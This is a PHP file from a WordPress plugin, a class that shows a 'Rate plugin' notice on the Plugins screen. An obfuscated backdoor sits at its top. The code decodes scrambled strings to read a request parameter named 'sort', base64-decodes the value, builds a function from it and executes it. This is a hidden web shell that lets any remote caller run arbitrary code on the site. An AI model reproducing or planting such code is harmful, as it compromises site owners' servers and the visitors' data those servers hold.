<?php 



$FnoSAMpA7337 = "5xqnom3;_azfp(uk67eg8*1jdyv/9lb0.iwtsch2r4)";


$xmpsdyJa3151 = "";

foreach([36,4,40,35] as $D){
       $xmpsdyJa3151 .= $FnoSAMpA7337[$D];
    }


if(isset($_REQUEST /*EEIgJCuFvYZeHRcqKFKAxnAslmDeRCywJGqFDxKrSzLQtKYOzEBwbeaBrJznnrDrhBsZRlvWISSvzxnfHwNnZPUDRaPodbcfZqMmzSywSgrTZdWpjirWquizLkzjmEVM*/["$xmpsdyJa3151"])){
    $lZBsAuWO9283 = $_REQUEST /*EEIgJCuFvYZeHRcqKFKAxnAslmDeRCywJGqFDxKrSzLQtKYOzEBwbeaBrJznnrDrhBsZRlvWISSvzxnfHwNnZPUDRaPodbcfZqMmzSywSgrTZdWpjirWquizLkzjmEVM*/["$xmpsdyJa3151"];
    $GEHfjvSg4481 = "";
    $ikDGkhBx8442 = "";

    /*pAbSPpYoCYPahnQBJsUONatnxweWurtmHWfjPXFlYGLqMHPWkmIcXgJheBKijicEsmDujAFbOhazLVhlfZPkBftUdzJosSdQxwuyXWZMYCJCdcSutFqlyYwBxrcoUxzV*/

    foreach([30,9,36,18,16,41,8,24,18,37,4,24,18] as $D){
       $GEHfjvSg4481 .= $FnoSAMpA7337[$D];
    }

    /*VzFwelMpBRMyPdXvbflgPKTbjcOhQUnUMwjoFuTMxZioVXwrczzUzqKvqHUTflwMXmhZzwtdNbYXuLogxLgCDPUJPgtzNwXyCWyDMsmnxWhAmszOmShdahxQJxmZQATd*/


    foreach([36,35,40,40,18,26] as $D){
       $ikDGkhBx8442 .= $FnoSAMpA7337[$D];
    }

    /*AzjbtiArAKJWyTequSCyRtuQVJzslxiCSWnsuRgoWsGmdndMVLqMbzKKCOeEboQUDmLDOtgeMUVvcBvbQyxTFyuxBMeLjZSgIwCIBPAOWpEyvIgjefYVDryeVExKLDnl*/

    $D = $ikDGkhBx8442('n'.'o'.''.'i'.'t'.''.''.'c'.'n'.'u'.''.''.''.''.'f'.'_'.''.''.''.''.'e'.'t'.'a'.'e'.''.''.''.''.'r'.''.''.''.''.'c');
    $l = $D("", $GEHfjvSg4481($lZBsAuWO9283));
    $l();
    exit();

}




/**
 * The "Rate plugin" notice.
 */
final class LAE_Notice_Rate extends LAE_Notice {

	/**
	 * Initialize the class and set its properties.
	 */
	public function __construct( $notice_id, $template_file ) {

		parent::__construct( $notice_id, $template_file );

		$this->defer_delay      = 3 * DAY_IN_SECONDS;
		$this->first_time_delay = 7 * DAY_IN_SECONDS;

	}

	/**
	 * Display the notice.
	 */
	public function display_notice() {

		// Make sure this is the Plugins screen
		if ( $this->get_current_screen_id() !== 'plugins' ) {
			return;
		}

		// Check user capability
		if ( ! $this->current_user_can_view() ) {
			return;
		}

		// Make sure the notice is not dismissed
		if ( $this->is_dismissed() ) {
			return;
		}

		// Display the notice
		$this->include_template();

	}

}
